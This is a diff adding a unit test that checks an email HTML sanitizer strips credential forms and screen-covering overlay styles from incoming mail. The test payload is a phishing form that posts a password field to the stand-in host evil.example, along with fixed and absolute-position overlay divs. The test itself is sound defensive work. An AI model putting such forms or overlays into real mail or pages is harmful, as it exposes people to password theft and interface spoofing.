@@ -343,4 +343,27 @@ describe('mailHtmlContent', () => {
     expect(anchorHtml).toMatch(/rel="[^"]*noopener/);
     expect(anchorHtml).toMatch(/rel="[^"]*noreferrer/);
   });
+
+  it('strips credential forms and viewport-overlay styles from incoming mail', () => {
+    const payload = '<form action="https://evil.example"><input type="password" name="pw">'
+      + '<button type="submit">Send</button><select><option>x</option></select>'
+      + '<textarea>secret</textarea></form>'
+      + '<div style="position:fixed;top:0;left:0;right:0;bottom:0;z-index:99999;color:#fff">fixed overlay</div>'
+      + '<div style="position:absolute;z-index:50">absolute overlay</div>';
+
+    const rendered = buildRenderedMailHtml(payload, []);
+    const sanitized = sanitizeMailHtmlFragment(payload);
+    const combined = `${rendered.html}\n${sanitized}`.toLowerCase();
+    const renderedLower = rendered.html.toLowerCase();
+
+    expect(combined).not.toContain('<form');
+    expect(combined).not.toContain('<input');
+    expect(combined).not.toContain('<button');
+    expect(combined).not.toContain('<select');
+    expect(combined).not.toContain('<textarea');
+    expect(renderedLower).not.toMatch(/position:\s*(fixed|absolute)/);
+    expect(renderedLower).not.toContain('z-index');
+    expect(rendered.html).toContain('fixed overlay');
+    expect(rendered.html).toContain('absolute overlay');
+  });
 });
